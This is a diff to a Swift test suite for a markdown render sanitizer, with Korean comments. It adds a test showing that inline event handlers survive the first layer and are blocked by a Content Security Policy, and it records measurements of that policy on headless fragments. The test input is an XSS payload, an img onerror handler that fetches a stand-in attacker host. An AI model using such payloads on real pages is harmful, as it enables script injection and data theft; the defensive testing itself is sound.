@@ -98,6 +98,34 @@ struct RenderDocumentSanitizerLimitTests {
         #expect(!policy.contains("file:"), "정책이 file: 을 허용하면 위 설명이 거짓이 된다")
     }
 
+    @Test("이벤트 핸들러는 1층이 지우지 않는다 — 2층이 막는다는 것을 실측했다")
+    func inlineEventHandlersAreLeftToTheBackstop() {
+        // 마크다운은 원시 HTML 을 품을 수 있고, 신뢰하지 않는 레포의 README 가
+        // `<img onerror="…">` 를 담는 것이 INV-6 이 상정한 바로 그 상황이다.
+        //
+        // 1층은 **참조만** 다루므로 핸들러 속성은 남는다. 그것이 결함이 아니라는 근거는
+        // 추론이 아니라 실측이다 — 스파이크에 인라인 핸들러 프로브를 넣고 **JS 를 켠 채**
+        // (즉 `allowsContentJavaScript = false` 의 도움 없이 **CSP 단독의 힘**만으로) 쟀다:
+        //
+        //   대조군 조각  원격 21건 · `/from-onerror` 3건 도착   ← 핸들러가 실제로 실행됨
+        //   CSP    조각  원격  0건 · `/from-onerror` 0건
+        //   CSP    페이지 원격  0건 · `/from-onerror` 0건
+        //
+        // `<script>` 요소와 인라인 핸들러는 **다른 구문이고 CSP 에서도 다른 검사를 탄다.**
+        // 앞의 것이 막힌다고 뒤의 것이 막히는 것은 아니라서 따로 쟀다.
+        //
+        // 따라서 핸들러를 여기서 긁어내는 규칙을 더하지 않는다 — 속성 이름 목록을 세는 방식은
+        // 빠뜨린 이름이 곧 구멍이고, 그 구멍은 조용하다. 이 층이 지키는 성질은 좁게 유지한다.
+        let result = sanitize("<img src=\"missing.png\" onerror=\"fetch('https://evil.example')\">")
+
+        #expect(result.html.contains("onerror"), "1층은 핸들러를 지우지 않는다 — 그 사실을 고정한다")
+        // 위 실측의 전제. 이 지시어가 빠지면 측정 결과가 근거가 아니게 되므로 같이 깨져야 한다.
+        #expect(
+            RenderDocumentSanitizer.contentSecurityPolicy.contains("script-src 'none'"),
+            "핸들러 차단의 근거가 이 지시어다"
+        )
+    }
+
     @Test("2층은 실측됐다 — 다만 이 테스트가 재는 것은 주입까지다")
     func theSecondLayerIsMeasuredElsewhere() {
         // **이 단위 테스트가 보장하는 것은 문자열이 문서에 들어간다는 것까지다.** 강제
@@ -108,6 +136,17 @@ struct RenderDocumentSanitizerLimitTests {
         //   CSP    loadHTMLString  원격  0건 · 래스터 표시됨
         //   대조군 loadFileURL     원격 18건 · 래스터 표시됨
         //   CSP    loadFileURL     원격  0건 · 래스터 표시됨
+        //
+        // **머리 없는 조각도 따로 쟀다**(2026-08-31, `--fragment`). 첫 측정은 `<head>` 가 있는
+        // 완전한 페이지만 재는데, **마크다운은 그 모양을 만들지 않는다** — 위의 "head 가 없는
+        // 조각에도 주입된다"가 바로 그 경로이고, 거기서는 정책 메타가 문서 맨 앞에 온다.
+        // 파서가 그것을 head 로 끌어올린다는 것은 그럴듯한 이야기였을 뿐이라 실제로 쟀다:
+        //
+        //   대조군 조각 loadHTMLString  원격 18건 · 래스터 표시됨
+        //   CSP    조각 loadHTMLString  원격  0건 · 래스터 표시됨
+        //   CSP    조각 loadFileURL     원격  0건 · 래스터 표시됨
+        //
+        // 즉 **마크다운 경로에서도 2층이 실재한다.** 재기 전까지 이 경로의 2층은 가정이었다.
         //
         // 대조군을 **먼저** 통과시켰기 때문에 0 이 "막았다"를 뜻한다 — 그 순서가 아니면
         // 0 은 "리스너가 고장났다"와 구별되지 않는다. 그리고 `data:` 래스터가 네 변종
